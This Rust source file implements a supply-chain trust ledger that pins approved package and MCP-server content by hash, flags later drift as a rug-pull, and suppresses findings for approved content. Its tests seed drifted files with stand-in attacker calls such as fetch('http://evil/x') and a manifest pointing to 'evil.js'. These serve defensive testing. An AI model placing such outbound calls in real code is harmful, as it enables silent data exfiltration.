//! Content-pinning trust ledger (ADR-0006, F-008 US-F1/US-F2).
//!
//! On `sigil approve`, the approved artifact's content is hashed file-by-file and
//! recorded under `~/.sigil/ledger/`. Every later re-encounter diffs current
//! content against this pin; drift is the rug-pull signal (US-F2). Approval binds
//! to CONTENT, not a name — the lesson of CVE-2025-54136 (Cursor "MCPoison", where
//! approval bound to a tool name yielded silent RCE) and postmark-mcp (benign for
//! 15 versions, then a BCC-exfil line in v1.0.16).

use crate::quarantine::QuarantineEntry;
use crate::scanner::normalize::is_instruction_file;
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

/// VCS/build/dependency directories excluded from the pin: they are not the
/// published artifact and would make the digest non-deterministic.
const EXCLUDED_DIRS: &[&str] = &[
    ".git",
    "node_modules",
    "target",
    "dist",
    "build",
    ".next",
    "__pycache__",
    ".venv",
    "venv",
];

/// The pinned content fingerprint of an approved artifact.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ContentPin {
    /// Package version when derivable from the source string (npm `@`, pip `==`).
    pub version: Option<String>,
    /// Aggregate digest over every file (sorted relpath + per-file content hash).
    /// The artifact-level pin — any content change moves it. This is the
    /// version+tarball hash equivalent the ADR calls for.
    pub artifact_digest: String,
    pub file_count: usize,
    /// relpath -> sha256(content) for every pinned file. The full map lets US-F2
    /// report exactly which files drifted, not merely that something did.
    pub files: BTreeMap<String, String>,
    /// Instruction files (SKILL.md / CLAUDE.md / .cursorrules / …) — the
    /// prompt-injection surface, called out separately so a steering-file change
    /// is visible at a glance.
    pub instruction_files: Vec<String>,
    /// MCP tool-definition files — the silent-RCE surface (MCPoison).
    pub tool_definitions: Vec<String>,
}

/// One approval record in the ledger.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LedgerRecord {
    pub id: String,
    pub source: String,
    pub source_type: String,
    pub approved_at: DateTime<Utc>,
    pub reason: Option<String>,
    pub pin: ContentPin,
}

// ── Hashing ────────────────────────────────────────────────────────────────

fn hash_bytes(bytes: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(bytes);
    hex::encode(h.finalize())
}

fn is_excluded_dir(name: &str) -> bool {
    EXCLUDED_DIRS.contains(&name)
}

/// MCP tool-definition manifests: explicit `mcp.json` / `tools.json` /
/// `*.mcp.json`, or a `package.json` that declares an MCP server / tool surface.
fn is_tool_definition_file(rel: &str, path: &Path) -> bool {
    let lower = rel.to_lowercase();
    let fname = lower.rsplit('/').next().unwrap_or(&lower);
    if fname == "mcp.json" || fname == "tools.json" || fname.ends_with(".mcp.json") {
        return true;
    }
    if fname == "package.json" {
        if let Ok(s) = std::fs::read_to_string(path) {
            if let Ok(v) = serde_json::from_str::<serde_json::Value>(&s) {
                return v.get("mcp").is_some()
                    || v.get("mcpServers").is_some()
                    || v.get("tools").is_some();
            }
        }
    }
    false
}

/// Walk `root` and produce a content pin. Pure with respect to the ledger store
/// (no disk writes) so it is directly testable.
pub fn pin_directory(root: &Path, version: Option<String>) -> ContentPin {
    use sha2::{Digest, Sha256};
    use walkdir::WalkDir;

    let mut files = BTreeMap::new();
    let mut instruction_files = Vec::new();
    let mut tool_definitions = Vec::new();

    let walker = WalkDir::new(root)
        .follow_links(false)
        .into_iter()
        .filter_entry(|e| {
            !(e.file_type().is_dir() && e.file_name().to_str().is_some_and(is_excluded_dir))
        });

    for entry in walker
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
    {
        let rel = entry
            .path()
            .strip_prefix(root)
            .unwrap_or(entry.path())
            .to_string_lossy()
            .replace('\\', "/");
        let bytes = match std::fs::read(entry.path()) {
            Ok(b) => b,
            Err(_) => continue,
        };
        if is_instruction_file(&rel) {
            instruction_files.push(rel.clone());
        }
        if is_tool_definition_file(&rel, entry.path()) {
            tool_definitions.push(rel.clone());
        }
        files.insert(rel, hash_bytes(&bytes));
    }

    // Aggregate digest: deterministic over the sorted (relpath, file-hash) pairs.
    // BTreeMap iterates in sorted key order, so this is stable across runs.
    let mut agg = Sha256::new();
    for (rel, hash) in &files {
        agg.update(rel.as_bytes());
        agg.update(b"\0");
        agg.update(hash.as_bytes());
        agg.update(b"\n");
    }
    instruction_files.sort();
    tool_definitions.sort();

    ContentPin {
        version,
        artifact_digest: hex::encode(agg.finalize()),
        file_count: files.len(),
        files,
        instruction_files,
        tool_definitions,
    }
}

/// Extract a package version from a quarantine source string when the ecosystem
/// pins one inline (`lodash@4.17.20`, `requests==2.31.0`).
fn version_from_source(source: &str, source_type: &str) -> Option<String> {
    match source_type {
        "npm" => source
            .rsplit_once('@')
            .filter(|(name, ver)| !name.is_empty() && !ver.is_empty())
            .map(|(_, v)| v.to_string()),
        "pip" => source
            .split_once("==")
            .filter(|(_, v)| !v.is_empty())
            .map(|(_, v)| v.to_string()),
        _ => None,
    }
}

// ── Store ──────────────────────────────────────────────────────────────────

/// Base ledger directory: `~/.sigil/ledger/`.
pub fn ledger_dir() -> PathBuf {
    dirs::home_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join(".sigil")
        .join("ledger")
}

fn index_path(dir: &Path) -> PathBuf {
    dir.join("index.json")
}

fn load_in(dir: &Path) -> Vec<LedgerRecord> {
    match std::fs::read_to_string(index_path(dir)) {
        Ok(s) => serde_json::from_str(&s).unwrap_or_default(),
        Err(_) => Vec::new(),
    }
}

fn save_in(dir: &Path, records: &[LedgerRecord]) -> Result<(), String> {
    std::fs::create_dir_all(dir).map_err(|e| format!("failed to create ledger dir: {}", e))?;
    let json = serde_json::to_string_pretty(records)
        .map_err(|e| format!("failed to serialize ledger: {}", e))?;
    std::fs::write(index_path(dir), json).map_err(|e| format!("failed to write ledger: {}", e))
}

/// Pin an approved entry's content and persist it. An existing record for the
/// same id is replaced (re-approval re-pins). Returns the stored record.
pub fn record_approval_in(
    dir: &Path,
    entry: &QuarantineEntry,
    reason: Option<&str>,
) -> Result<LedgerRecord, String> {
    let version = version_from_source(&entry.source, &entry.source_type);
    let pin = pin_directory(&entry.path, version);
    let record = LedgerRecord {
        id: entry.id.clone(),
        source: entry.source.clone(),
        source_type: entry.source_type.clone(),
        approved_at: Utc::now(),
        reason: reason.map(str::to_string),
        pin,
    };

    let mut records = load_in(dir);
    records.retain(|r| r.id != record.id);
    records.push(record.clone());
    save_in(dir, &records)?;
    Ok(record)
}

/// Fetch a ledger record by id.
pub fn get_in(dir: &Path, id: &str) -> Option<LedgerRecord> {
    load_in(dir).into_iter().find(|r| r.id == id)
}

/// Remove a ledger record by id (approval revocation — `sigil reject` of a
/// previously-approved artifact must also revoke its allowlist pin, or the
/// rejected content would keep suppressing findings). Returns whether a record
/// was removed.
pub fn remove_in(dir: &Path, id: &str) -> Result<bool, String> {
    let mut records = load_in(dir);
    let before = records.len();
    records.retain(|r| r.id != id);
    if records.len() == before {
        return Ok(false);
    }
    save_in(dir, &records)?;
    Ok(true)
}

/// Match scanned content against the approval ledger (F-010 US-H1).
///
/// Returns the approved record whose pinned `artifact_digest` is byte-identical
/// to the current content of `root`. Drifted content returns `None` — drift
/// attribution and re-quarantine belong to the rug-pull path
/// (`detect_rugpull`), never the allowlist. An empty pin never matches: the
/// digest-of-nothing would otherwise act as a universal allowlist key.
pub fn match_approved_in(dir: &Path, root: &Path) -> Option<LedgerRecord> {
    let current = pin_directory(root, None);
    if current.files.is_empty() {
        return None;
    }
    load_in(dir)
        .into_iter()
        .find(|r| r.pin.artifact_digest == current.artifact_digest)
}

// Default-location wrappers used by the CLI.

pub fn record_approval(
    entry: &QuarantineEntry,
    reason: Option<&str>,
) -> Result<LedgerRecord, String> {
    record_approval_in(&ledger_dir(), entry, reason)
}

pub fn get(id: &str) -> Option<LedgerRecord> {
    get_in(&ledger_dir(), id)
}

pub fn remove(id: &str) -> Result<bool, String> {
    remove_in(&ledger_dir(), id)
}

// ── Scan-time suppression (F-010 US-H2) ─────────────────────────────────────

use crate::scanner::ScanResult;

/// Apply trust-ledger allowlisting to a scan result (F-010 US-H2).
///
/// When the content of `root` digest-matches an approved pin, every finding is
/// moved to `suppressed_findings` (visible, never dropped) and score/verdict
/// are recomputed over the now-empty active set. Returns whether suppression is
/// in effect.
///
/// Always begins by restoring any previously-suppressed findings, so cached
/// results are re-evaluated against the CURRENT ledger — a pin revoked since
/// the cache was written must restore its findings.
///
/// Suppression aborts when:
/// - `ignore` is set (`--ignore-ledger`),
/// - content does not exactly match an approved pin (drift ⇒ rug-pull path),
/// - any RUGPULL-001 finding is present (a drift signal against a path-bound
///   pin outranks a content match against another record).
pub fn apply_suppression_in(
    dir: &Path,
    result: &mut ScanResult,
    root: &Path,
    ignore: bool,
) -> bool {
    let restored = !result.suppressed_findings.is_empty();
    if restored {
        let mut prior = std::mem::take(&mut result.suppressed_findings);
        result.findings.append(&mut prior);
    }
    result.suppressed_by = None;

    let matched = if ignore || result.findings.iter().any(|f| f.rule == "RUGPULL-001") {
        None
    } else {
        match_approved_in(dir, root)
    };
    if let Some(rec) = matched {
        result.suppressed_findings = std::mem::take(&mut result.findings);
        result.suppressed_by = Some(format!(
            "ledger:{}#{} approved {}",
            rec.source,
            rec.id,
            rec.approved_at.format("%Y-%m-%d")
        ));
    }

    if restored || result.suppressed_by.is_some() {
        result.score = crate::scanner::scoring::calculate_score(&result.findings);
        result.verdict = crate::scanner::scoring::determine_verdict(&result.findings, result.score);
    }
    result.suppressed_by.is_some()
}

/// Default-location wrapper for the CLI.
pub fn apply_suppression(result: &mut ScanResult, root: &Path, ignore: bool) -> bool {
    apply_suppression_in(&ledger_dir(), result, root, ignore)
}

// ── Rug-pull detection (US-F2) ──────────────────────────────────────────────

use crate::scanner::{Finding, Phase, Severity};

/// Diff the current content of an approved artifact against its pinned baseline.
/// Any drift in the pinned bytes is a rug-pull signal (ADR-0006): an artifact that
/// was reviewed-and-approved cannot silently change. Returns a single Critical
/// `RUGPULL-001` finding describing the diff, or an empty Vec when nothing changed.
///
/// Changes to the watched surfaces — MCP tool-definition manifests and instruction
/// files — are called out explicitly in the diff, because those are the
/// silent-RCE / prompt-injection vectors the pin exists to guard.
pub fn detect_rugpull(current_dir: &Path, baseline: &LedgerRecord) -> Vec<Finding> {
    let current = pin_directory(current_dir, baseline.pin.version.clone());
    if current.artifact_digest == baseline.pin.artifact_digest {
        return Vec::new();
    }

    let mut modified = Vec::new();
    let mut added = Vec::new();
    for (path, hash) in &current.files {
        match baseline.pin.files.get(path) {
            Some(old) if old != hash => modified.push(path.clone()),
            None => added.push(path.clone()),
            _ => {}
        }
    }
    let mut removed: Vec<String> = baseline
        .pin
        .files
        .keys()
        .filter(|p| !current.files.contains_key(*p))
        .cloned()
        .collect();
    modified.sort();
    added.sort();
    removed.sort();

    // Watched surfaces: tool-definition manifests + instruction files, on either
    // side of the diff (a file can gain or lose that classification).
    let watched: std::collections::HashSet<&String> = baseline
        .pin
        .tool_definitions
        .iter()
        .chain(baseline.pin.instruction_files.iter())
        .chain(current.tool_definitions.iter())
        .chain(current.instruction_files.iter())
        .collect();
    let changed_watched: Vec<String> = modified
        .iter()
        .chain(added.iter())
        .chain(removed.iter())
        .filter(|f| watched.contains(*f))
        .cloned()
        .collect();

    let mut summary = format!(
        "approved artifact '{}' drifted since {}: {} modified, {} added, {} removed",
        baseline.source,
        baseline.approved_at.to_rfc3339(),
        modified.len(),
        added.len(),
        removed.len(),
    );
    // Always surface the actual changed files (a code change like an added
    // exfil line is the real payload, even when a manifest also moved).
    let changed_sample: Vec<&String> = modified.iter().chain(added.iter()).take(6).collect();
    if !changed_sample.is_empty() {
        summary.push_str(&format!(
            "; changed: {}",
            changed_sample
                .iter()
                .map(|s| s.as_str())
                .collect::<Vec<_>>()
                .join(", ")
        ));
    }
    if !changed_watched.is_empty() {
        summary.push_str(&format!(
            "; tool-definition/instruction files changed: {}",
            changed_watched.join(", ")
        ));
    }

    // Point the finding at the highest-signal changed file (a watched surface if
    // one drifted, else the first modified/added file).
    let file = changed_watched
        .first()
        .or_else(|| modified.first())
        .or_else(|| added.first())
        .cloned()
        .unwrap_or_else(|| ".".to_string());

    vec![Finding {
        phase: Phase::Provenance,
        rule: "RUGPULL-001".to_string(),
        severity: Severity::Critical,
        file,
        line: None,
        snippet: summary,
        weight: 10,
        kev: false,
        epss: 0.0,
    }]
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::quarantine::{QuarantineEntry, QuarantineStatus};
    use std::fs;

    fn write(dir: &Path, rel: &str, contents: &str) {
        let p = dir.join(rel);
        if let Some(parent) = p.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(p, contents).unwrap();
    }

    fn temp() -> PathBuf {
        let base = std::env::temp_dir().join(format!(
            "sigil-ledger-test-{}",
            uuid::Uuid::new_v4().simple()
        ));
        fs::create_dir_all(&base).unwrap();
        base
    }

    fn fake_entry(artifact: &Path, source: &str, source_type: &str) -> QuarantineEntry {
        QuarantineEntry {
            id: "ledtest1".to_string(),
            source: source.to_string(),
            source_type: source_type.to_string(),
            path: artifact.to_path_buf(),
            status: QuarantineStatus::Approved,
            created_at: Utc::now(),
            updated_at: Utc::now(),
            reason: None,
            scan_score: None,
        }
    }

    #[test]
    fn ledger_pin_hashes_files_and_is_deterministic() {
        let art = temp();
        write(&art, "index.js", "console.log('hi')\n");
        write(&art, "SKILL.md", "# instructions\n");

        let a = pin_directory(&art, None);
        let b = pin_directory(&art, None);
        assert_eq!(
            a.artifact_digest, b.artifact_digest,
            "pin must be deterministic"
        );
        assert_eq!(a.file_count, 2);
        assert!(a.files.contains_key("index.js"));
        assert!(a.files.contains_key("SKILL.md"));
    }

    #[test]
    fn ledger_pin_classifies_instruction_and_tool_files() {
        let art = temp();
        write(&art, "SKILL.md", "do the thing\n");
        write(
            &art,
            "package.json",
            r#"{"name":"x","mcp":{"server":"./server.js"}}"#,
        );
        write(&art, "server.js", "// server\n");

        let pin = pin_directory(&art, None);
        assert_eq!(pin.instruction_files, vec!["SKILL.md".to_string()]);
        assert_eq!(pin.tool_definitions, vec!["package.json".to_string()]);
    }

    #[test]
    fn ledger_pin_excludes_vcs_and_node_modules() {
        let art = temp();
        write(&art, "main.py", "print('ok')\n");
        write(&art, ".git/config", "[core]\n");
        write(&art, "node_modules/dep/index.js", "module.exports={}\n");

        let pin = pin_directory(&art, None);
        assert_eq!(pin.file_count, 1, "only main.py should be pinned");
        assert!(pin.files.contains_key("main.py"));
        assert!(!pin.files.keys().any(|k| k.contains("node_modules")));
        assert!(!pin.files.keys().any(|k| k.contains(".git")));
    }

    #[test]
    fn ledger_pin_digest_changes_when_content_changes() {
        let art = temp();
        write(&art, "a.js", "v1\n");
        let before = pin_directory(&art, None);
        write(&art, "a.js", "v1 + malicious_bcc\n");
        let after = pin_directory(&art, None);
        assert_ne!(
            before.artifact_digest, after.artifact_digest,
            "content change must move the digest"
        );
    }

    #[test]
    fn ledger_version_parsed_from_source() {
        assert_eq!(
            version_from_source("lodash@4.17.20", "npm"),
            Some("4.17.20".to_string())
        );
        assert_eq!(
            version_from_source("@scope/pkg@1.2.3", "npm"),
            Some("1.2.3".to_string())
        );
        assert_eq!(version_from_source("lodash", "npm"), None);
        assert_eq!(
            version_from_source("requests==2.31.0", "pip"),
            Some("2.31.0".to_string())
        );
        assert_eq!(version_from_source("https://github.com/x/y", "git"), None);
    }

    const RUGPULL_FIXTURES: &str =
        concat!(env!("CARGO_MANIFEST_DIR"), "/../tests/fixtures/rugpull");

    fn baseline_from(dir: &Path, source: &str) -> LedgerRecord {
        let entry = fake_entry(dir, source, "npm");
        let store = temp();
        record_approval_in(&store, &entry, None).unwrap()
    }

    #[test]
    fn rugpull_unchanged_artifact_produces_no_finding() {
        let v1 = PathBuf::from(RUGPULL_FIXTURES).join("v1-benign");
        let baseline = baseline_from(&v1, "postmark-mcp@1.0.15");
        // Re-scan the SAME content that was approved.
        let findings = detect_rugpull(&v1, &baseline);
        assert!(
            findings.is_empty(),
            "unchanged re-scan must produce zero rug-pull findings, got {:?}",
            findings.iter().map(|f| &f.snippet).collect::<Vec<_>>()
        );
    }

    #[test]
    fn rugpull_content_drift_produces_critical_rugpull_001() {
        let v1 = PathBuf::from(RUGPULL_FIXTURES).join("v1-benign");
        let v2 = PathBuf::from(RUGPULL_FIXTURES).join("v2-malicious");
        let baseline = baseline_from(&v1, "postmark-mcp@1.0.15");
        // The "new version" added a BCC-exfil line to index.js.
        let findings = detect_rugpull(&v2, &baseline);
        assert_eq!(
            findings.len(),
            1,
            "drift must yield exactly one RUGPULL-001"
        );
        let f = &findings[0];
        assert_eq!(f.rule, "RUGPULL-001");
        assert_eq!(f.severity, Severity::Critical);
        assert_eq!(f.weight, 10);
        assert!(
            f.snippet.contains("drifted"),
            "diff summary must describe the drift: {}",
            f.snippet
        );
        assert!(
            f.file == "index.js" || f.snippet.contains("index.js"),
            "the changed file must be identified: file={} snippet={}",
            f.file,
            f.snippet
        );
    }

    #[test]
    fn rugpull_flags_changed_tool_definition_surface() {
        // Approve a server, then change its package.json (tool-definition manifest).
        let art = temp();
        write(
            &art,
            "package.json",
            r#"{"name":"x","version":"1.0.0","mcp":{"server":"./s.js"}}"#,
        );
        write(&art, "s.js", "// safe\n");
        let baseline = baseline_from(&art, "x@1.0.0");

        let next = temp();
        write(
            &next,
            "package.json",
            r#"{"name":"x","version":"1.0.0","mcp":{"server":"./evil.js"}}"#,
        );
        write(&next, "s.js", "// safe\n");
        let findings = detect_rugpull(&next, &baseline);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0]
                .snippet
                .contains("tool-definition/instruction files changed")
                && findings[0].snippet.contains("package.json"),
            "tool-definition drift must be called out: {}",
            findings[0].snippet
        );
    }

    // ── US-H1: digest-keyed match (F-010 trust-ledger allowlisting) ─────────

    #[test]
    fn match_approved_exact_content_returns_record() {
        let art = temp();
        write(&art, "index.js", "console.log('hi')\n");
        write(&art, "lib/util.js", "module.exports = 1\n");
        let store = temp();
        let entry = fake_entry(&art, "good-pkg@1.0.0", "npm");
        let rec = record_approval_in(&store, &entry, Some("reviewed")).unwrap();

        // A different directory with byte-identical content must match: the pin
        // binds to content, not to the quarantine path.
        let copy = temp();
        write(&copy, "index.js", "console.log('hi')\n");
        write(&copy, "lib/util.js", "module.exports = 1\n");

        let m = match_approved_in(&store, &copy).expect("identical content must match");
        assert_eq!(m.id, rec.id);
        assert_eq!(m.pin.artifact_digest, rec.pin.artifact_digest);
    }

    #[test]
    fn match_approved_drifted_content_returns_none() {
        let art = temp();
        write(&art, "index.js", "console.log('hi')\n");
        let store = temp();
        record_approval_in(&store, &fake_entry(&art, "good-pkg@1.0.0", "npm"), None).unwrap();

        // Any byte of drift disqualifies suppression — drift handling belongs to
        // the rug-pull path, never the allowlist.
        write(
            &art,
            "index.js",
            "console.log('hi'); fetch('http://evil/x')\n",
        );
        assert!(match_approved_in(&store, &art).is_none());
    }

    #[test]
    fn match_approved_unknown_content_returns_none() {
        let store = temp();
        let other = temp();
        write(&other, "main.py", "print('never approved')\n");
        assert!(match_approved_in(&store, &other).is_none());
    }

    #[test]
    fn match_approved_empty_directory_never_matches() {
        // Two empty directories share the same digest-of-nothing; an empty pin
        // must not become a universal allowlist key.
        let empty_art = temp();
        let store = temp();
        record_approval_in(&store, &fake_entry(&empty_art, "empty@1.0.0", "npm"), None).unwrap();
        let empty_scan = temp();
        assert!(match_approved_in(&store, &empty_scan).is_none());
    }

    #[test]
    fn ledger_remove_revokes_approval() {
        let art = temp();
        write(&art, "index.js", "console.log('hi')\n");
        let store = temp();
        record_approval_in(&store, &fake_entry(&art, "good-pkg@1.0.0", "npm"), None).unwrap();
        assert!(match_approved_in(&store, &art).is_some());

        assert!(
            remove_in(&store, "ledtest1").unwrap(),
            "existing record removed"
        );
        assert!(
            match_approved_in(&store, &art).is_none(),
            "revoked pin must not match"
        );
        assert!(get_in(&store, "ledtest1").is_none());
        assert!(
            !remove_in(&store, "ledtest1").unwrap(),
            "second remove is a no-op"
        );
    }

    // ── US-H2: scan-time suppression (F-010) ────────────────────────────────

    fn fake_finding(rule: &str, severity: Severity) -> Finding {
        Finding {
            phase: Phase::CodePatterns,
            rule: rule.to_string(),
            severity,
            file: "index.js".to_string(),
            line: Some(1),
            snippet: "eval(x)".to_string(),
            weight: 5,
            kev: false,
            epss: 0.0,
        }
    }

    fn fake_result(findings: Vec<Finding>) -> crate::scanner::ScanResult {
        let score = crate::scanner::scoring::calculate_score(&findings);
        let verdict = crate::scanner::scoring::determine_verdict(&findings, score);
        crate::scanner::ScanResult {
            findings,
            score,
            verdict,
            files_scanned: 1,
            duration_ms: 1,
            suppressed_findings: Vec::new(),
            suppressed_by: None,
        }
    }

    #[test]
    fn suppression_moves_findings_and_rewrites_verdict() {
        let art = temp();
        write(&art, "index.js", "eval(x)\n");
        let store = temp();
        record_approval_in(&store, &fake_entry(&art, "good-pkg@1.0.0", "npm"), None).unwrap();

        let mut result = fake_result(vec![
            fake_finding("CODE-001", Severity::High),
            fake_finding("CODE-002", Severity::High),
        ]);
        assert!(result.score > 0);

        let applied = apply_suppression_in(&store, &mut result, &art, false);
        assert!(applied, "exact-match content must suppress");
        assert!(
            result.findings.is_empty(),
            "active findings must be emptied"
        );
        assert_eq!(result.suppressed_findings.len(), 2, "no silent drops");
        assert_eq!(result.score, 0);
        assert_eq!(result.verdict, crate::scanner::Verdict::LowRisk);
        let by = result
            .suppressed_by
            .as_deref()
            .expect("attribution required");
        assert!(
            by.contains("good-pkg@1.0.0"),
            "attribution names the source: {}",
            by
        );
    }

    #[test]
    fn suppression_skipped_when_ignored() {
        let art = temp();
        write(&art, "index.js", "eval(x)\n");
        let store = temp();
        record_approval_in(&store, &fake_entry(&art, "good-pkg@1.0.0", "npm"), None).unwrap();

        let mut result = fake_result(vec![fake_finding("CODE-001", Severity::High)]);
        let before_score = result.score;
        let applied = apply_suppression_in(&store, &mut result, &art, true);
        assert!(!applied);
        assert_eq!(result.findings.len(), 1);
        assert_eq!(result.score, before_score);
        assert!(result.suppressed_by.is_none());
    }

    #[test]
    fn suppression_skipped_for_drifted_content() {
        let art = temp();
        write(&art, "index.js", "eval(x)\n");
        let store = temp();
        record_approval_in(&store, &fake_entry(&art, "good-pkg@1.0.0", "npm"), None).unwrap();
        write(&art, "index.js", "eval(x); fetch('http://evil')\n");

        let mut result = fake_result(vec![fake_finding("CODE-001", Severity::High)]);
        assert!(!apply_suppression_in(&store, &mut result, &art, false));
        assert_eq!(
            result.findings.len(),
            1,
            "drifted content keeps its findings"
        );
    }

    #[test]
    fn suppression_never_swallows_rugpull_findings() {
        // Defense in depth: if a RUGPULL-001 is present (e.g. drift against a
        // different path-bound pin), suppression must abort entirely.
        let art = temp();
        write(&art, "index.js", "eval(x)\n");
        let store = temp();
        record_approval_in(&store, &fake_entry(&art, "good-pkg@1.0.0", "npm"), None).unwrap();

        let mut result = fake_result(vec![
            fake_finding("CODE-001", Severity::High),
            fake_finding("RUGPULL-001", Severity::Critical),
        ]);
        assert!(!apply_suppression_in(&store, &mut result, &art, false));
        assert_eq!(
            result.findings.len(),
            2,
            "rug-pull scans are never suppressed"
        );
        assert!(result.suppressed_by.is_none());
    }

    #[test]
    fn cached_suppressed_result_is_reevaluated_against_current_ledger() {
        // A cached result carries yesterday's suppression; the ledger record has
        // since been revoked. Re-evaluation must restore the findings.
        let art = temp();
        write(&art, "index.js", "eval(x)\n");
        let store = temp(); // empty ledger == revoked

        let mut result = fake_result(Vec::new());
        result.suppressed_findings = vec![fake_finding("CODE-001", Severity::High)];
        result.suppressed_by = Some("ledger:good-pkg@1.0.0#ledtest1".to_string());

        assert!(!apply_suppression_in(&store, &mut result, &art, false));
        assert_eq!(
            result.findings.len(),
            1,
            "revoked pin must restore findings"
        );
        assert!(result.suppressed_findings.is_empty());
        assert!(result.suppressed_by.is_none());
        assert!(result.score > 0, "score must be recomputed after restore");
    }

    #[test]
    fn scanresult_without_suppression_fields_deserializes() {
        // Cache backward-compat: pre-F-010 cached JSON has no suppression fields.
        let old =
            r#"{"findings":[],"score":0,"verdict":"LowRisk","files_scanned":3,"duration_ms":9}"#;
        let parsed: crate::scanner::ScanResult =
            serde_json::from_str(old).expect("old cache entries must still parse");
        assert!(parsed.suppressed_findings.is_empty());
        assert!(parsed.suppressed_by.is_none());
    }

    #[test]
    fn ledger_record_and_get_round_trip() {
        let art = temp();
        write(&art, "index.js", "console.log(1)\n");
        write(&art, "mcp.json", r#"{"tools":[]}"#);
        let store = temp();

        let entry = fake_entry(&art, "my-mcp@1.0.0", "npm");
        let rec = record_approval_in(&store, &entry, Some("looks fine")).unwrap();
        assert_eq!(rec.pin.version, Some("1.0.0".to_string()));
        assert_eq!(rec.reason.as_deref(), Some("looks fine"));
        assert!(rec.pin.tool_definitions.contains(&"mcp.json".to_string()));

        let fetched = get_in(&store, "ledtest1").expect("record must persist");
        assert_eq!(fetched.pin.artifact_digest, rec.pin.artifact_digest);
        assert_eq!(fetched.source, "my-mcp@1.0.0");

        // Re-approval replaces, never duplicates.
        let again = record_approval_in(&store, &entry, None).unwrap();
        assert_eq!(again.id, "ledtest1");
        assert_eq!(load_in(&store).len(), 1);
    }
}
